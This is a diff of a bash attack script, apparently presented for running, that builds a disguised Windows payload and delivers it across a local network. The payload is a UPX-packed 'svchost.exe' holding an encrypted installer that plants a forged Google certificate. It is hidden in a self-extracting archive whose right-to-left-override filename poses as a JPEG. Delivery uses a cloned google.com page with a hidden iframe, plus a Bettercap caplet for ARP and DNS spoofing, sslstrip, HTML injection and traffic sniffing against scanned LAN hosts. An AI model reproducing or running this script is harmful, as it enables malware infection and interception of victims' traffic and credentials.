@@ -27,75 +27,73 @@ color_print() { printf "${!1}%b${RESET}\n" "$2"; }
 # --- Root Privilege Check ---
 [[ "$(id -u)" -ne 0 ]] && { color_print RED "[X] Please run as ROOT."; exit 1; }
 
-# --- Variables ---
-WINEPREFIX="$HOME/.wine64"
-ICON_PATH="/tmp/google.ico"
-CERT_NAME="google.crt"
-CERT_PATH="/var/www/html/$CERT_NAME"
-SCRIPT_PATH="/tmp/cert-installer.py"
-DIST_PATH="$HOME/wine-pyinstaller/dist"
-EXE_NAME="svchost.exe"
-SFX_OUT="/var/www/html/google-update-%E2%80%AEexe.jpg"
-UPX_URL="https://github.com/upx/upx/releases/download/v4.2.1/upx-4.2.1-win64.zip"
-
 # --- Install Required Tools ---
 color_print CYAN "[*] Checking and installing required tools..."
-apt update -y
-for pkg in wget curl jq rar unzip imagemagick apache2 arp-scan python3 python3-pip wine64 winbind winetricks metasploit-framework bettercap; do
-    dpkg -s "$pkg" &>/dev/null || apt install -y "$pkg"
+packages=(
+  wget curl jq rar unzip imagemagick apache2 arp-scan python3 python3-pip wine64 winbind winetricks metasploit-framework bettercap
+)
+
+for pkg in "${packages[@]}"; do
+  if ! dpkg -s "$pkg" &>/dev/null; then
+    color_print YELLOW "[!] Package $pkg not found. Installing..."
+    apt install -y "$pkg"
+  fi
 done
-pip3 install pycryptodome >/dev/null 2>&1
 
 # --- Setup WINE and Install Windows Python ---
 color_print GREEN "[*] Setting up WINE and installing Windows Python..."
 export WINEPREFIX="$HOME/.wine64"
 export WINEARCH=win64
-wineboot --init
-wget -q https://www.python.org/ftp/python/3.9.13/python-3.9.13-amd64.exe -O /tmp/python39.exe
-WINEPREFIX="$HOME/.wine64" wine /tmp/python39.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
+python_ver="3.13.5"
+python_ver_current=$(wine cmd /c "python --version" 2>&1 | awk '{print $2}')
+if [ ! "$python_ver" == "$python_ver_current" ]; then
+    wineboot --init
+    wget -q -O "/tmp/python3.exe" "https://www.python.org/ftp/python/${python_ver}/python-${python_ver}-amd64.exe"
+    wine /tmp/python3.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
+    rm -f "/tmp/python3.exe"
+fi
 
 # --- Download UPX for Windows ---
 color_print CYAN "[*] Downloading UPX for Windows..."
-mkdir -p "$WINEPREFIX/drive_c/upx"
-wget -q "$UPX_URL" -O /tmp/upx.zip
-unzip -q /tmp/upx.zip -d /tmp/
-cp /tmp/upx-4.2.1-win64/upx.exe "$WINEPREFIX/drive_c/upx/"
+upx_ver="5.0.2"
+upx_ver_current=$(wine cmd /c "$WINEPREFIX/drive_c/upx/upx.exe -L" 2>&1 | head -n1 | awk '{print $2}')
+if [ ! "$upx_ver" == "$upx_ver_current" ]; then
+    wget -q -O "/tmp/upx.zip" "https://github.com/upx/upx/releases/download/v${upx_ver}/upx-${upx_ver}-win64.zip"
+    mkdir -p "$WINEPREFIX/drive_c/upx"
+    unzip -q -o "/tmp/upx.zip" -d "/tmp"
+    cp "/tmp/upx-${upx_ver}-win64/upx.exe" "$WINEPREFIX/drive_c/upx/"
+fi
 
 # --- Detect Interface and Local IP ---
 color_print GREEN "[*] Detecting network interface and local IP..."
 IFACE=$(ip route | grep '^default' | awk '{print $5}' | head -1)
 LAN=$(ip -4 addr show "$IFACE" | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
-[[ -z "$IFACE" || -z "$LAN" ]] && { color_print RED "[X] Failed to detect interface or IP."; exit 1; }
 
 # --- Cleanup ---
-pkill -f 'ngrok|ruby|msfconsole|apache2'
-rm -rf "$HOME/.msf4/loot/"
-rm -rf "$WINEPREFIX/drive_c/pyinstaller-build" "$DIST_PATH"
+pkill -f "ngrok|ruby|msfconsole|apache2"
+rm -rf "$HOME/.msf4/loot/" \
+       "$HOME/wine-pyinstaller/dist" \
+       "$WINEPREFIX/drive_c/pyinstaller-build" \
 mkdir -p "$WINEPREFIX/drive_c/pyinstaller-build"
 
 # --- Generate Fake Certificate using Metasploit ---
 color_print CYAN "[*] Generating fake certificate using Metasploit..."
 msfconsole -qx "use auxiliary/gather/impersonate_ssl;set RHOSTS google.com;run;exit"
-
 CERT_CRT=$(find "$HOME/.msf4/loot/" -type f -name "*.crt" | head -1)
 CERT_KEY=$(find "$HOME/.msf4/loot/" -type f -name "*.key" | head -1)
-[[ ! -f "$CERT_CRT" || ! -f "$CERT_KEY" ]] && { color_print RED "[X] Certificate generation failed."; exit 1; }
-cp "$CERT_CRT" "$CERT_PATH"
+cp -f "$CERT_CRT" "/var/www/html/google.crt"
 
 # --- Download Image and Create Icon ---
-wget -q "https://wallpapers.com/images/hd/google-starry-night-dzelbpuo5oj39ie6.jpg" -O /tmp/google.jpg
-convert "/tmp/google.jpg" -define icon:auto-resize=96 "$ICON_PATH"
+color_print CYAN "[*] Download Image and Create Icon..."
+wget -q -O /tmp/google.jpg "https://wallpapers.com/images/hd/google-starry-night-dzelbpuo5oj39ie6.jpg"
+convert /tmp/google.jpg -define icon:auto-resize=256,128,96,64,48,32,16 /tmp/google.ico
 
 # --- Generate random AES Key and IV ---
 KEY=$(head -c 16 /dev/urandom | xxd -p)
 IV=$(head -c 16 /dev/urandom | xxd -p)
 
-color_print CYAN "[*] Generated AES Key: $KEY"
-color_print CYAN "[*] Generated AES IV: $IV"
-
 # --- Build Encrypted Python Installer ---
 color_print GREEN "[*] Building AES-CBC encrypted Python installer..."
-
 python3 - <<PYTHON
 from Crypto.Cipher import AES
 import base64
@@ -104,7 +102,7 @@ import os
 key = bytes.fromhex("$KEY")
 iv = bytes.fromhex("$IV")
 
-with open("$CERT_PATH", "rb") as f:
+with open("/var/www/html/google.crt", "rb") as f:
     cert_b64 = base64.b64encode(f.read()).decode()
 
 payload = f'''
@@ -184,66 +182,54 @@ with open("/tmp/cert-installer.py", "w") as f:
     f.write(final_code)
 PYTHON
 
-cp "$SCRIPT_PATH" "$WINEPREFIX/drive_c/pyinstaller-build/cert_installer.py"
-cp "$ICON_PATH" "$WINEPREFIX/drive_c/pyinstaller-build/google.ico"
+cp -f "/tmp/cert-installer.py" "$WINEPREFIX/drive_c/pyinstaller-build/cert_installer.py"
+cp -f "/tmp/google.ico" "$WINEPREFIX/drive_c/pyinstaller-build/google.ico"
 
 # --- Install PyInstaller and Build EXE Hidden ---
 wine python -m pip install --upgrade pip setuptools wheel
 wine python -m pip install pyinstaller
-
 wine pyinstaller --onefile --noconfirm --noconsole \
     --icon "C:\\pyinstaller-build\\google.ico" \
-    --name "$EXE_NAME" \
+    --name "svchost.exe" \
     --upx-dir "C:\\upx" \
     "C:\\pyinstaller-build\\cert_installer.py"
-
-cp "$WINEPREFIX/drive_c/users/$USER/dist/$EXE_NAME" "$DIST_PATH/"
+cp -f "$WINEPREFIX/drive_c/users/$USER/dist/svchost.exe" "$HOME/wine-pyinstaller/dist/"
 
 # --- Create SFX RAR with RLO Filename ---
 cat > /tmp/sfx.txt << EOF
 ;The comment below contains SFX script commands
 Path=C:\\Users\\%username%\\AppData\\Local\\Temp
-Setup=$EXE_NAME
+Setup=svchost.exe
 Presetup=google.jpg
 Silent=1
 Overwrite=1
 Update=U
 EOF
-
-rar a -sfx -z"/tmp/sfx.txt" "$SFX_OUT" "$DIST_PATH/$EXE_NAME" /tmp/google.jpg
+rar a -sfx -z"/tmp/sfx.txt" "/var/www/html/google-update-%E2%80%AEexe.jpg" "$HOME/wine-pyinstaller/dist/svchost.exe" /tmp/google.jpg
 
 # --- Start Apache Server and Setup Injection ---
 service apache2 restart
-rm -f /var/www/html/index.html
+rm -rf /var/www/html/*
 wget -q -O /var/www/html/index.html -c -k -U "Mozilla/5.0 (Macintosh; Intel MacOS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" https://google.com
-INJECT_HTML="<iframe id='frame' src='google-update-%E2%80%AEexe.jpg' application='yes' width=0 height=0 style='display:none;' frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe>\n<script type='text/javascript'>setTimeout(function(){window.location.href='https://google.com';}, 15000);</script>"
+INJECT_HTML="<iframe id='frame' src='google-update-%E2%80%AEexe.jpg' application='yes' width=0 height=0 style='display:none;' frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe>\n<script type='text/javascript'>setTimeout(function(){window.location.href='https://google.com';}, 3000);</script>"
 sed -i "s|</body>|${INJECT_HTML}\n</body>|g" /var/www/html/index.html
 
 # --- Scan Network for Victims ---
-color_print CYAN "[*] Scanning LAN for targets..."
 TARGETS=$(arp-scan --interface="$IFACE" --localnet --ignoredups --plain | awk '{print $1}' | grep -v "$LAN" | paste -sd ',' -)
-[[ -z "$TARGETS" ]] && { color_print RED "[X] No targets found on the LAN."; exit 1; }
 
 # --- Create Bettercap Caplet for MITM with Downgrade Fallback ---
-CAPLET_PATH="/tmp/mitm_fallback.cap"
-
-cat > "$CAPLET_PATH" << EOF
+cat > "/tmp/mitm_fallback.cap" << EOF
 set arp.spoof.targets $TARGETS
 set arp.spoof.internal true
-
 set https.proxy.engine true
 set https.proxy.sslstrip true
 set https.proxy.cert $CERT_CRT
 set https.proxy.key $CERT_KEY
-
 set http.proxy.injecthtml '<iframe src="http://$LAN/google-update-%E2%80%AEexe.jpg" width=0 height=0 style="display:none"></iframe>'
-
 set net.sniff.verbose true
 set net.sniff.output /tmp/bettercap.log
-
 set dns.spoof.domains google.com
 set dns.spoof.address $LAN
-
 dns.spoof on
 net.sniff on
 http.proxy on
@@ -255,8 +241,7 @@ event tls.handshake.failed do |e|
 end
 EOF
 
-color_print GREEN "[*] Launching Bettercap MITM attack with downgrade fallback..."
-bettercap -iface "$IFACE" -caplet "$CAPLET_PATH"
+bettercap -iface "$IFACE" -caplet "/tmp/mitm_fallback.cap"
 ```
 
 _Run & Execute_
